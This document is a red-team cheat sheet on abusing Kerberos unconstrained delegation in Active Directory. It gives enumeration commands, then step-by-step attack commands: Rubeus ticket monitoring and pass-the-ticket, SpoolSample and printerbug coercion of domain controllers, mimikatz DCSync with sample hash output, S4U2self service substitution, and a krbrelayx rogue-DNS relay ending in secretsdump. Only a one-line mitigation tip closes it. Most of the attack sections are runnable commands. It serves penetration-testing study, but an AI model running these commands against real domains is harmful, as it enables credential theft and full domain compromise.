### Content

- [Enumeration](#enumeration)
- [Attacking Computers](#attacking-computers)
	- [S4U2self](#s4u2self)
- [Attacking Accounts](#attacking-accounts)

> [!Important]
> 
> Unconstrained delegation abuses are usually combined with an [authentication coercion attack](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/) (e.g.  [MS-RPRN abuse (printerbug)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn), [MS-EFSR abuse (petitpotam)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr), [MS-FSRVP abuse (shadowcoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp), r [PrivExchange](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)) to gain domain admin privileges.
> 
> If the `impersonated` account is [is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts) or a member of the [Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) group, the delegation will fail.
> 
> The RID 500, "Administrator" account doesn't benefit from that restriction, even if it's added to the Protected Users group (source: [sensepost.com](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/)).
> 
> By default, the salt is always:
> 
> - For users: uppercase FQDN + case sensitive username = `DOMAIN.LOCALuser`
> - For computers: uppercase FQDN + hardcoded `host` text + lowercase FQDN hostname without the trailing `$`
>    = `DOMAIN.LOCALhostcomputer.domain.local`  (using `DOMAIN.LOCAL\computer$` account)

<img src="/assets/unconstrained_delegation_cheat_sheet.png" style="display: block; margin:auto; width:700px;">

---
### Enumeration

From a domain joined Windows host:

```PowerShell
# Using PowerView
# Enumearting Computers
Get-DomainComputer -Unconstrained -Properties samaccountname #DCs aren't useful for privesc
# Enumerating Users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# ADSearch
# Enumerating computers
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# ActiveDirectory PowerShell Module
Get-ADComputer -Filter 'TrustedForDelegation -eq $true' | select -property samaccountname
Get-ADUser -Filter 'TrustedForDelegation -eq $true' | select -property samaccountname

```

From a Linux host:

``` bash
# Using findDelegation.py from impacket to list both users and computers
findDelegation.py corp.local/sAMAccountName:Password -dc-ip <dcIP>
```

---
### Attacking Computers

If an attacker was able to compromise a server that has unconstrained delegation enabled, and he had administrative privileges over that server, any object that logs in or authenticate to that server will get their TGT embed into the server cache, which can be dumped to move laterally.

We can wait for valuable users to authenticate to the compromised server, or we can even coerce the DC to authenticate to us by any technique (e.g. printer bug).

```PowerShell
# Monitor tickets using rubeus:
.\Rubeus.exe monitor /interval:5 /nowrap

# if a user appeared, we can enumerate his groups through powerview
Get-DomainGroup -MemberIdentity <sAMAccountName>

# Using the TGT we got, ask the dc for a tgs for other service on behalf of the target user
# If the target is a domain admin we can edit /service:krbtgt/CORP.LOCAL for dcsync 
.\Rubeus.exe asktgs /ticket:doIFmT<SNIP>LkxPQ0FM /service:cifs/dc01.CORP.local /ptt

# If the TGT didn't work, we can renew it
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
```

Coerce the DC to authenticate to the compromised server using the printer pug [SpoolSample PoC](https://github.com/leechristensen/SpoolSample).

```PowerShell
PS C:\Tools> .\SpoolSample.exe dc01.corp.local sql01.corp.local
```

Now, Suppose we got the TGT of the DC using [Printer Bug](#printer-bug), using targeted DCSync mimikatz to get the Administrator hash:

```PowerShell
C:\Tools> mimikatz.exe
mimikatz # lsadump::dcsync /user:Administrator
[SNIP]
Credentials:
  Hash NTLM: a83b750679b1789e29e966d06c7e41f7
```

We can generate a TGT for the administrator and pass it into the current session:

```PowerShell
PS C:\Tools> .\Rubeus.exe asktgt /rc4:a83b750679b1789e29e966d06c7e41f7 /user:Administrator /ptt
# After this step we can access any resource and service from the current session
```

#### S4U2self

Allowing a service or a server to obtain a TGS to itself on behalf of a user.

The scenario:

- Start with a compromised host that has Unconstrained Delegation enabled.
- Use `SpoolSample` to coerce `DC01$` into authenticating to our host, which will cause the DC TGT to be cached in memory due to Unconstrained Delegation.
- Captured that DC TGT using Rubeus monitor.
- With DC TGT in hand, we used `Rubeus s4u /self` to submit an `S4U2self` request to the KDC:
	- From the KDC's perspective, The DC itself is requesting a TGS impersonating Administrator for itself, and because the DC  is a trusted unconstrained delegation host.
	- The KDC issues the TGS with the service set to `DC01$@CORP.LOCAL`.
	- Rubeus then substitutes the SPN via `/altservice` to `CIFS/dc01.corp.local`
		- This works because the service name field in the TGS is not covered by the KDC's cryptographic signature, meaning Rubeus can modify it post-issuance without invalidating the ticket.
		- The `PAC` inside the ticket, which carries Administrator's privileges, remains untouched.
		- The resulting TGS is then injected into our session via `/ptt`, giving us full SMB access to DC01 as Administrator, all without ever knowing a single password or hash.

```PowerShell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.corp.local /ptt /ticket:<The_DC01_TGT>
```

---
### Attacking Accounts

Our scenario:

- Attacker (A) compromised a target user account (B) that has `TRUSTED_FOR_DELEGATION` flag set.
- Attacker (A) has also compromised `user0` which has `GenericWrite` privileges over user (B).
- (A) will create a DNS record on the AD environment which will point at his rogue machine.
- (A) will add `CIFS/malicious_dns_record` SPN to (B) account.
- If a victim tried to connect via SMB to the attacker fake record:
	- victim will ask the DC for a TGS for `CIFS/malicious_dns_record`.
	- The DC will embed a TGT for the victim account into the TGS.
	- The TGS will be send to the IP set on the malicious DNS record.

Using Dirkjanm's [krbrelayx](https://github.com/dirkjanm/krbrelayx) tools suite for this attack.

```bash
$ git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx

# Add fake dns record (rogue.corp.local) pointing to attacker IP (x.x.x.x) using any domain account
$ dnstool.py -u corp.local\\user0 -p password -r rogue.corp.local -d (attackerIP) --action add <dcIP>

# making sure every thing is ok, query the rogue machine through the DC (wait few mins)
$ nslookup rogue.corp.local dc01.corp.local

# Craft SPN on the Target User
# --target-type: [samname (for attacking a user)] - [hostname (for attacking a host /default)]
# -t (the compromised user that has unconstrained delegation set)
$ addspn.py -u corp.local\\user0 -p password --target-type samname -t vulnerableAccount -s CIFS/rogue.corp.local dc01.corp.local

# Use krbrelayx.py with the compromised account NT hash to decrypt the received TGS to extract the target TGT.
$ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
# If you don't have the NT hash, you can supply the salt and the password:
$ sudo python krbrelayx.py --krbsalt 'CORP.LOCALvulnerableAccount' --krbpass 'password'
# Or supply the right Kerberos long-term key directly
krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE

# printerbug.py to coerce a target to autheticate back to the attacker
$ printerbug.py corp.local/user0:password@<targetIP> rogue.corp.local
# or user dementor.py
$ dementor.py -u user0 -p password -d corp.local rogue.corp.local dc01.corp.local
```

The TGT has been saved to disk in the following file `DC01$@CORP.LOCAL_krbtgt@CORP.LOCAL.ccache`. now we can conduct DCSync attack with the DC TGT.

```bash
$ export KRB5CCNAME=./DC01\$@CORP.LOCAL_krbtgt@CORP.LOCAL.ccache
$ secretsdump.py -k -no-pass dc01.corp.local
```

When attacking accounts able to delegate without constraints, there are two major scenarios

- Delegated account is a computer:
	- Computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute.
	- Ticket received by krbrelayx will be encrypted with AES256 (by default), attackers will need to either supply:
		- The right AES256 key for the unconstrained delegations account (`--aesKey` argument)
		- The salt and password (`--krbsalt` and `--krbpass` arguments).
- Delegated account is a user:
	- users can't edit their own SPNs like computers do.
	- Attackers need to control an [account operator](https://www.thehacker.recipes/ad/movement/builtins/security-groups) (or any other user that has the needed privileges) to edit the user's SPNs. 
	- Ticket received by krbrelayx will be encrypted with RC4, attackers will need to either supply:
		- NT hash (`-hashes` argument)
		- The salt and password (`--krbsalt` and `--krbpass` arguments)

> [!tip]
> 
> As a mitigation: > Sensitive accounts can be marked as `Sensitive and cannot be delegated` or be placed into the `Protected User group`. This group blocks its members from being used for Kerberos delegation and will keep their TGTs off hosts after they authenticate.